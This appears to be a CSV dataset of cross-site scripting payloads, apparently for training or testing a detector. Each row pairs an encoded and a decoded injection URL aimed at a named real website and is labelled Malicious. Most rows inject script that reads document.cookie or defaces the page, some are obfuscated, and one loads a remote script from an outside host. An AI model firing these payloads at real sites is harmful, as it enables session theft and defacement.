Payloads,Class,decoded,executed,parser_changed
http://www.arabnews.com/?page=1&amp;section=0&amp;article=63138&amp;d=3&amp;m=5&amp;y=2005&amp;pix=%22%3ekingdom.jpg&amp;categor<br>y=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious,"http://www.arabnews.com/?page=1§ion=0&article=63138&d=3&m=5&y=2005&pix="">kingdom.jpg&category=""><script>alert(document.cookie);</script>",True,True
http://www.undernet.org/news/index.php?page=2&amp;session=&quot;&gt;&lt;script&gt;alert(9)&lt;/script&gt;,Malicious,"http://www.undernet.org/news/index.php?page=2&session=""><script>alert(9)</script>",True,True
http://www.artbongard.net/gallery.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script%<br>3e,Malicious,"http://www.artbongard.net/gallery.php?id='""></title><script>alert(1337)</script>",True,True
http://www.intute.ac.uk/sciences/cgi-bin/search.pl?term1=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.intute.ac.uk/sciences/cgi-bin/search.pl?term1=""><script>alert(""maxwel"")</script>",True,True
http://www.aranzadi.es/index.php/buscador?q=%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3e&amp;<br>x=0&amp;y=0&amp;m=any,Malicious,"http://www.aranzadi.es/index.php/buscador?q=""><script>alert(document.cookie)</script>&x=0&y=0&m=any",True,True
https://www.unlocks.co.uk/order.php?asic=%3cscript%3ealert(666)%3c/script%3e,Malicious,https://www.unlocks.co.uk/order.php?asic=<script>alert(666)</script>,True,True
http://www.oppnasverige.gov.se/sb/d/126/a/136/action/search/type/simple;jsessionid=a9uzgreg%22%3e%3c<br>script%3ealert(123)%3c/script%3eu3sns5g?query=reg&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;,Malicious,"http://www.oppnasverige.gov.se/sb/d/126/a/136/action/search/type/simple;jsessionid=a9uzgreg""><script>alert(123)</script>u3sns5g?query=reg""><script>alert(123)</script>",True,True
http://www.discountedscripts.com/demos/videonew/list.php?q=%3cscript%3ealert(%27drakula%27)%3c/scrip<br>t%3e,Malicious,http://www.discountedscripts.com/demos/videonew/list.php?q=<script>alert('drakula')</script>,True,True
http://vmo.nasa.gov/index.php?tstyle=style12%27%22%3e%3cmarquee%3e%3cimg%20src=k.png%20onerror=alert<br>(/xss/.source)%20/%3e,Malicious,"http://vmo.nasa.gov/index.php?tstyle=style12'""><marquee><img src=k.png onerror=alert(/xss/.source) />",True,True
http://www.softwarepublico.gov.br/fisl9/%7d%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source))<br>;%3c/script%3e,Malicious,http://www.softwarepublico.gov.br/fisl9/}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,True,True
"http://www.iiar-anticancer.org/search.php?srch=""><script>alert(document.cookie)</script>&x=0&y=0",Malicious,"http://www.iiar-anticancer.org/search.php?srch=""><script>alert(document.cookie)</script>&x=0&y=0",True,True
http://www.gmp.police.uk/live/nhoodv3.nsf/index-divisions.html?readform&amp;division=&quot;&gt;&lt;script&gt;alert(1);<br>&lt;/script&gt;,Malicious,"http://www.gmp.police.uk/live/nhoodv3.nsf/index-divisions.html?readform&division=""><script>alert(1);</script>",True,True
http://www.infusionconnections.com/member/profile.php?profile_id=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script<br>&gt;,Malicious,"http://www.infusionconnections.com/member/profile.php?profile_id=""><script>alert(""backdoor"")</script>",True,True
http://www.iblogyou.fr/index.php?page=annuaire&amp;orderby=titre&amp;sens=&lt;script&gt;alert(/xss/)&lt;/script&gt;,Malicious,http://www.iblogyou.fr/index.php?page=annuaire&orderby=titre&sens=<script>alert(/xss/)</script>,True,True
http://www.dominiquealboublanc.com/page.php?src=infoslegales.html&amp;lang=fr/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious,"http://www.dominiquealboublanc.com/page.php?src=infoslegales.html&lang=fr/""><script>alert('xss byatm0n3r')</script>",True,True
http://www.airtahitinui.com.au/search/search.asp?searwords=%22%3e%3cscript%3ealert(%22jock3r%22)%3c/<br>script%3e,Malicious,"http://www.airtahitinui.com.au/search/search.asp?searwords=""><script>alert(""jock3r"")</script>",True,True
http://my.hardwarezone.com/core/search.php?submit.x=1&amp;submit.y=1&amp;q=%3cscript%3ealert(document.cookie<br>);%3c/script%3e,Malicious,http://my.hardwarezone.com/core/search.php?submit.x=1&submit.y=1&q=<script>alert(document.cookie);</script>,True,True
http://www.dexia.com/e/services/search.php?search=+}%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dalert%3<br>ba(b(%2fxss%2f.source))%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss+by+xylitol%3c%<br>2fh1%3e%3c%2fmarquee%3e&amp;x=0&amp;y=0,Malicious,"http://www.dexia.com/e/services/search.php?search= }</style><script>a=eval;b=alert;a(b(/xss/.source));</script><marquee bgcolor=""red""><h1>xss by xylitol</h1></marquee>&x=0&y=0",True,True
http://www.ask.com/ref?qsrc=1&amp;o=41647999&amp;l=dir&amp;q=&quot;&gt;&lt;script/&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.ask.com/ref?qsrc=1&o=41647999&l=dir&q=""><script/>alert(document.cookie)</script>",True,True
http://www.visitcharlotte.com/default.asp?charlotte=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.visitcharlotte.com/default.asp?charlotte=""><script>alert(""maxwel"")</script>",True,True
http://www.x.org/search.php3?keywords=&quot;&gt;&lt;script&gt;alert('turkistiklal.com')&lt;/script&gt;,Malicious,"http://www.x.org/search.php3?keywords=""><script>alert('turkistiklal.com')</script>",True,True
http://www.desifre-oldun.org/mods.php?go=pm&amp;p=wri_msg&amp;towho=%3c/title%3e%3c/head%3e%3cscript%3ealert<br>(document.cookie)%3c/script%3e,Malicious,http://www.desifre-oldun.org/mods.php?go=pm&p=wri_msg&towho=</title></head><script>alert(document.cookie)</script>,True,True
http://search.cleveland.com/sp?aff=100&amp;keywords=%22%3e%3c/title%3e%3cscript%3ealert(%22xss%20by%20mr<br>doug%22)%3c/script%3e&amp;x=8&amp;y=7,Malicious,"http://search.cleveland.com/sp?aff=100&keywords=""></title><script>alert(""xss by mrdoug"")</script>&x=8&y=7",True,True
http://www.annonces.luxweb.com/mostviewed.php?catid=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious,"http://www.annonces.luxweb.com/mostviewed.php?catid=<script>alert(""xss"")</script>",True,True
http://zone.org/search.php?search_type=1&amp;contenttype=vbblog_blogentry&amp;query=%22%3e%3cscript%3ealert%<br>28%22daimon%22%29%3c/script%3e,Malicious,"http://zone.org/search.php?search_type=1&contenttype=vbblog_blogentry&query=""><script>alert(""daimon"")</script>",True,True
http://www.census.gov/acs/www/acs-php/experienced_users_guide.php?acs_topic=place+of+birth-domestic&quot;<br>&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.census.gov/acs/www/acs-php/experienced_users_guide.php?acs_topic=place of birth-domestic""><script>alert(document.cookie)</script>",True,True
http://www.ncgg.info/main.php?id=26%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.ncgg.info/main.php?id=26""><script>alert(document.cookie)</script>",True,True
http://h.ula.cc/dance/?kenken=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious,"http://h.ula.cc/dance/?kenken=""><script>alert(/xss/)</script>",True,True
http://webpy.infogami.com/godaddy.com%7d%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3<br>c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss_by_xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://webpy.infogami.com/godaddy.com}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>'""><marquee><h1>xss_by_xylitol</h1></marquee>",True,True
http://mlb.mlb.com/mlb/sweepstakes/y2008/state_farm/callyourshot_sweeps.jsp?sf_ref=%22%3e%3cscript%3<br>ealert(document.cookie);%3c/script%3e&amp;partnerid=s00468,Malicious,"http://mlb.mlb.com/mlb/sweepstakes/y2008/state_farm/callyourshot_sweeps.jsp?sf_ref=""><script>alert(document.cookie);</script>&partnerid=s00468",True,True
https://www.paypal.com/nvpsm?amount=5.00&amp;currency_code=usd&amp;sender_country=&quot;&gt;&lt;script&gt;alert('xss')&lt;/sc<br>ript&gt;,Malicious,"https://www.paypal.com/nvpsm?amount=5.00¤cy_code=usd&sender_country=""><script>alert('xss')</script>",True,True
http://fletchersite.com/classifieds/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://fletchersite.com/classifieds/signinform.php?msg=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://store.corriere.it/prodotto/9568-c004/%22%3e%3e/byxados/%3cscript%3ealert(document.cookie)%3c/<br>script%3e/1/prime-pagine-corriere/catalogo/imprese-e-scoperte/il-primo-trapianto-di-cuore-della-stor<br>ia.html,Malicious,"http://store.corriere.it/prodotto/9568-c004/"">>/byxados/<script>alert(document.cookie)</script>/1/prime-pagine-corriere/catalogo/imprese-e-scoperte/il-primo-trapianto-di-cuore-della-storia.html",True,True
http://www.power99.net/gallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.power99.net/gallery/login.asp?folder=&n=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.mutlupartner.tv/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22document.cookie%22)%3c/scr<br>ipt%3e,Malicious,"http://www.mutlupartner.tv/odeme.asp?defurunid=""><script>alert(""document.cookie"")</script>",True,True
http://www.cayirbagi.org.tr/galeri/login.asp?folder=yatakhane&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.cayirbagi.org.tr/galeri/login.asp?folder=yatakhane&n=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.devconnections.com/shows/sp2007asp/default.asp?s=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.devconnections.com/shows/sp2007asp/default.asp?s=""><script>alert(""maxwel"")</script>",True,True
http://www.now7.co.uk/videogallery_watch_view.php?id=92%22%3e%3cscript%3ealert('airroxssed');%3c/scr<br>ipt%3e,Malicious,"http://www.now7.co.uk/videogallery_watch_view.php?id=92""><script>alert('airroxssed');</script>",True,True
http://www.gazeteler.com/?=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.gazeteler.com/?=""><script>alert(document.cookie)</script>",True,True
http://ec.europa.eu/avservices/photo/photo_reportage_en.cfm?nump=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://ec.europa.eu/avservices/photo/photo_reportage_en.cfm?nump=""><script>alert(""maxwel"")</script>",True,True
http://www.banquepopulaire.fr/scripts/groupe/publigen/content/templates/show.asp?p=207&amp;l=fr&amp;full_tex<br>t=&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;,Malicious,"http://www.banquepopulaire.fr/scripts/groupe/publigen/content/templates/show.asp?p=207&l=fr&full_text=""><script>alert(""xss"")</script>",True,True
http://video.superonline.com/detail.php?ccid=4&amp;ssid=5=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;f<br>ujked&lt;/h1&gt;,Malicious,"http://video.superonline.com/detail.php?ccid=4&ssid=5=""><script>alert(document.cookie)</script><h1>fujked</h1>",True,True
http://www.nutella.ru/recepts/index.php?state=main&amp;event=recept_view&amp;page=0&amp;recept_id=&gt;&quot;&gt;&lt;script%20%<br>0a%0d&gt;alert(/xss%20by%20turkpower/)%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.nutella.ru/recepts/index.php?state=main&event=recept_view&page=0&recept_id=>""><script 
>alert(/xss by turkpower/);</script><h1>xss by turkpower</h1></marquee>",True,True
http://www.team-aaa.com/root/profile.php?enter_id=%22'e/%3e%3cscript%3ealert(1)%3c/script%3e,Malicious,"http://www.team-aaa.com/root/profile.php?enter_id=""'e/><script>alert(1)</script>",True,True
http://www.die-schockers.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;ba<br>ckdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.die-schockers.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.odevtr.com/ara_bul.asp?search=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.odevtr.com/ara_bul.asp?search=""><script>alert(document.cookie)</script>",True,True
http://eunis.eea.europa.eu/sites-factsheet.jsp?tab=1&amp;idsite=a00010083%3cscript%3ealert('agd_scorp')%<br>3c/script%3e,Malicious,http://eunis.eea.europa.eu/sites-factsheet.jsp?tab=1&idsite=a00010083<script>alert('agd_scorp')</script>,True,True
http://www.hotcdljobs.com/jobs/jobinfo.php?j_id=96394&amp;c_id=132508/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://www.hotcdljobs.com/jobs/jobinfo.php?j_id=96394&c_id=132508/""><script>alert(1)</script>",True,True
http://english.huaian.gov.cn/%3cscript%3ealert(%22xssed%20by%20prashant%22)%3c/script%3e.do,Malicious,"http://english.huaian.gov.cn/<script>alert(""xssed by prashant"")</script>.do",True,True
http://www.redsalud.gov.cl/noticias/noticias.php?id_n=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/<br>script%3e,Malicious,"http://www.redsalud.gov.cl/noticias/noticias.php?id_n=""><script>alert(/ar3sw0rmed/);</script>",True,True
http://www.nasa-academy.org/db/yearbookview.php?id=%22%3e/xados/%3e%3cscript%3ealert(document.cookie<br>)%3c/script%3e%3cscript%20src=http://www.securitycode.it/x.js%3e%3c/script%3e,Malicious,"http://www.nasa-academy.org/db/yearbookview.php?id="">/xados/><script>alert(document.cookie)</script><script src=http://www.securitycode.it/x.js></script>",True,True
http://www.dineroconpaypal.com/publico/b5.asp?ref=citruxz}&lt;/style&gt;&lt;script&gt;a=eval;b=alert;a(b(/xss/.s<br>ource));&lt;/script&gt;'&quot;&gt;&lt;marquee&gt;&lt;h1&gt;&quot;&gt;&lt;script&gt;alert(&quot;fugitif&quot;)&lt;/script&gt;&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.dineroconpaypal.com/publico/b5.asp?ref=citruxz}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>'""><marquee><h1>""><script>alert(""fugitif"")</script></h1></marquee>",True,True
"sitefrom='""><script>alert(1)</script>&urlfrom='""><script>alert(1)</script>&engine='""><script>alert(1 )</script>&typemessage='""><script>alert(1)</script>&mail='""><script>alert(1)</script>&message='""><sc ript>alert(1)</script>",Malicious,"sitefrom='""><script>alert(1)</script>&urlfrom='""><script>alert(1)</script>&engine='""><script>alert(1 )</script>&typemessage='""><script>alert(1)</script>&mail='""><script>alert(1)</script>&message='""><sc ript>alert(1)</script>",True,True
http://www.desarrollourbano.buenosaires.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/scr<br>ipt%3e,Malicious,"http://www.desarrollourbano.buenosaires.gov.ar/avisos/?menu_id=""><script>alert(/xss/)</script>",True,True
http://www.albkomunitet.com/cgi-bin/ourspace/login.cgi?command=%22%3e%3cscript%3ealert(document.cook<br>ie)%3c/script%3e,Malicious,"http://www.albkomunitet.com/cgi-bin/ourspace/login.cgi?command=""><script>alert(document.cookie)</script>",True,True
http://suche.community.freenet.de/freunde-finden/index.html?sort=by_lastlogin&amp;table=galerie&amp;sl_alter<br>sbereich=egal&amp;tb_nickname=%22%3e%3cscript%3ealert(/totalschaden/)%3c/script%3e&amp;tb_plz=&amp;sl_bundesland<br>=egal&amp;suche_starten.x=34&amp;suche_starten.y=12&amp;aktion=ver_searching_bearbeiten,Malicious,"http://suche.community.freenet.de/freunde-finden/index.html?sort=by_lastlogin&table=galerie&sl_altersbereich=egal&tb_nickname=""><script>alert(/totalschaden/)</script>&tb_plz=&sl_bundesland=egal&suche_starten.x=34&suche_starten.y=12&aktion=ver_searching_bearbeiten",True,True
http://cgi.din.or.jp/~tabito/diary/board.cgi?act=write&amp;diary=200709201'%3e%22%3e'%3e%3cscript%3ealer<br>t(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious,"http://cgi.din.or.jp/~tabito/diary/board.cgi?act=write&diary=200709201'>"">'><script>alert(""xss by kusomiso.com"")</script>",True,True
http://www.teknomar.net/teknomardemo/default.asp?say=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.teknomar.net/teknomardemo/default.asp?say=""><script>alert(""backdoor"")</script>",True,True
http://byinvitationonlyphotos.americanexpress.com/photo.php?img=7259%22%3e%3cscript%3ealert%28document.cookie%29;%3c/script%3e&p=680%27&intlink=bio_twitter,Malicious,"http://byinvitationonlyphotos.americanexpress.com/photo.php?img=7259""><script>alert(document.cookie);</script>&p=680'&intlink=bio_twitter",True,True
http://turkyigitleri.com/goster.php?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://turkyigitleri.com/goster.php?id=""><script>alert(document.cookie)</script>",True,True
http://www.gametrailers.com/reviews.php?plattyfilt=&amp;letter=w%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%<br>6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%3<br>2%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c<br>%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://www.gametrailers.com/reviews.php?plattyfilt=&letter=w"">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
http://someonelikesme.com/search.php?uid=wdc48d802390a6381.33931936&amp;src=auto&amp;term=%3cscript%3ealert(<br>123)%3c/script%3e&amp;args=qs%3d06oenya4zgjbluudydvq89vie-3nf8_y0osajxt-4zk6dbgxrtyguu0coyba0s_uzrz1sxka<br>k1q4ahoqytttijd4eqshwbc8fq8k9pdyyezq5zudm3y06ryqidvl6edesjh5zwqdxgo2dbofls-y7kx4jr75fub9ms--v6rkerso<br>l-6z7srzybfs2mp4ugutwce1sdekdp7ru.%2cyt03&amp;sec=r,Malicious,"http://someonelikesme.com/search.php?uid=wdc48d802390a6381.33931936&src=auto&term=<script>alert(123)</script>&args=qs=06oenya4zgjbluudydvq89vie-3nf8_y0osajxt-4zk6dbgxrtyguu0coyba0s_uzrz1sxkak1q4ahoqytttijd4eqshwbc8fq8k9pdyyezq5zudm3y06ryqidvl6edesjh5zwqdxgo2dbofls-y7kx4jr75fub9ms--v6rkersol-6z7srzybfs2mp4ugutwce1sdekdp7ru.,yt03&sec=r",True,True
http://search.kathimerini.gr/?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://search.kathimerini.gr/?keyword=""><script>alert(document.cookie)</script>",True,True
http://www.mehtap.tv/index.php?prgid=69&amp;ktgid=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)%3<br>b%3c/script%3e,Malicious,"http://www.mehtap.tv/index.php?prgid=69&ktgid=>""><script 
>alert(document.cookie);</script>",True,True
http://dateazeri.com/member/profile.php?profile_id=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://dateazeri.com/member/profile.php?profile_id=""><script>alert(""backdoor"")</script>",True,True
http://www.usedsaxes.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.usedsaxes.com/signinform.php?msg=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.hostingpanama.com/index.php?set_language=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;cccpag<br>e=hp_noticias_detail&amp;set_z_noticias=25,Malicious,"http://www.hostingpanama.com/index.php?set_language=""><script>alert(document.cookie)</script>&cccpage=hp_noticias_detail&set_z_noticias=25",True,True
http://www.montehermoso.gov.ar/lonkotech/ver_pagina.php?id_pagina=%22%3e%3cscript%3ealert%28/ar3sw0r<br>med/%29;%3c/script%3e,Malicious,"http://www.montehermoso.gov.ar/lonkotech/ver_pagina.php?id_pagina=""><script>alert(/ar3sw0rmed/);</script>",True,True
http://www.huberh.at/gaestebuch/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.huberh.at/gaestebuch/index.php?lang=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.s-inc.com/news/h.php?catid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.s-inc.com/news/h.php?catid=""><script>alert(""maxwel"")</script>",True,True
http://geo.fotolog.com/directory?state=h9&amp;city=london&amp;country=&quot;&gt;&lt;script&gt;alert(/www.r3t.n3t.nl/)&lt;/scr<br>ipt&gt;,Malicious,"http://geo.fotolog.com/directory?state=h9&city=london&country=""><script>alert(/www.r3t.n3t.nl/)</script>",True,True
http://www.directory.wiredawg.net/index.php?q=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://www.directory.wiredawg.net/index.php?q=""><script>alert(document.cookie);</script>",True,True
http://pendotiba.niteroi.rj.gov.br/phppgadmin/redirect.php/%22%3e%3cscript%3ealert(%22xssed%22)%3c/s<br>cript%3e?subject=server&amp;server=test,Malicious,"http://pendotiba.niteroi.rj.gov.br/phppgadmin/redirect.php/""><script>alert(""xssed"")</script>?subject=server&server=test",True,True
http://www.training.fema.gov/emiweb/cgi-shl/goodbye.asp?url=&quot;&gt;&lt;script&gt;alert(/www.r3t.n3t.nl/)&lt;/scrip<br>t&gt;,Malicious,"http://www.training.fema.gov/emiweb/cgi-shl/goodbye.asp?url=""><script>alert(/www.r3t.n3t.nl/)</script>",True,True
http://search.zol.com.cn/s/search.php?keyword=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%<br>22%27&amp;x=0&amp;y=0,Malicious,"http://search.zol.com.cn/s/search.php?keyword="">'><script>alert(123)</script>""'&x=0&y=0",True,True
http://www.gebzegazetesi.com/v0.7/?s=y&amp;n=or&amp;2005=t&amp;yazar=&quot;&gt;&lt;/noscript&gt;&lt;script&gt;alert(document.cookie)<br>;&lt;/script&gt;&amp;go=1,Malicious,"http://www.gebzegazetesi.com/v0.7/?s=y&n=or&2005=t&yazar=""></noscript><script>alert(document.cookie);</script>&go=1",True,True
http://www.travelsd.com/vsd/index.asp?subcategory=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.travelsd.com/vsd/index.asp?subcategory=""><script>alert(""maxwel"")</script>",True,True
http://hitmanslife2.com/register.php?ref='&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,http://hitmanslife2.com/register.php?ref='><script>alert(1);</script>,True,True
http://government.zdnet.com/index.php?kw=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e<br>&amp;page_id=1592,Malicious,"http://government.zdnet.com/index.php?kw=""><script>alert(document.cookie)</script>&page_id=1592",True,True
http://dqname.jp/m.php?md=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://dqname.jp/m.php?md=""><script>alert(""maxwel"")</script>",True,True
http://www.divshare.com/signup?ref=&quot;&gt;'&gt;&lt;script&gt;alert(123)&lt;/script&gt;,Malicious,"http://www.divshare.com/signup?ref="">'><script>alert(123)</script>",True,True
http://www.developersdex.com/search.asp?search=&quot;&gt;&lt;script&gt;alert('0ssi3-xht')&lt;/script&gt;,Malicious,"http://www.developersdex.com/search.asp?search=""><script>alert('0ssi3-xht')</script>",True,True
https://www.presbyweb.com/subscriptions/presbyweb/login.jsp?redirect=%22%3e%3cscript%3ealert(%22maxw<br>el%22)%3c/script%3e,Malicious,"https://www.presbyweb.com/subscriptions/presbyweb/login.jsp?redirect=""><script>alert(""maxwel"")</script>",True,True
http://lawoffice.mohme.gov.ir/laws/dedicated_law/laws.jsp?id=1&amp;id2=&quot;&lt;script&gt;alert(/xss/);&lt;/script&gt;,Malicious,"http://lawoffice.mohme.gov.ir/laws/dedicated_law/laws.jsp?id=1&id2=""<script>alert(/xss/);</script>",True,True
http://iphone.cnet.com/site?sid=cnet_ip&amp;pid=search&amp;searchtxt=+}%3c%2fstyle%3e%3cscript%3ea%3deval%3b<br>b%3dalert%3ba(b(%2fxss%2f.source))%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss+by+<br>xylitol%3c%2fh1%3e%3c%2fmarquee%3e,Malicious,"http://iphone.cnet.com/site?sid=cnet_ip&pid=search&searchtxt= }</style><script>a=eval;b=alert;a(b(/xss/.source));</script><marquee bgcolor=""red""><h1>xss by xylitol</h1></marquee>",True,True
http://foggia.bakeca.it/tutte-le-categorie-0?%22%3c/script%3e%3cscript%3ealert(document.cookie);%3c/<br>script%3e%3cscript%3e,Malicious,"http://foggia.bakeca.it/tutte-le-categorie-0?""</script><script>alert(document.cookie);</script><script>",True,True
http://www.flightclubny.com/c.php?fc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.flightclubny.com/c.php?fc=""><script>alert(""maxwel"")</script>",True,True
http://www.cctvtime.com/shopdisplayproducts.asp?id=1033&amp;cat=&lt;/script&gt;&quot;&gt;&lt;script&gt;alert(&quot;by<br>st@rext&quot;)&lt;/script&gt;,Malicious,"http://www.cctvtime.com/shopdisplayproducts.asp?id=1033&cat=</script>""><script>alert(""byst@rext"")</script>",True,True
http://www.nytimes.com/2007/09/16/automobiles/16miles.html?_r=1&amp;ex=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&amp;oref=slogin,Malicious,"http://www.nytimes.com/2007/09/16/automobiles/16miles.html?_r=1&ex=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>&oref=slogin",True,True
http://www.cap-pro.ch/fr/cap.asp?id='&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.cap-pro.ch/fr/cap.asp?id='""><script>alert(document.cookie)</script>",True,True
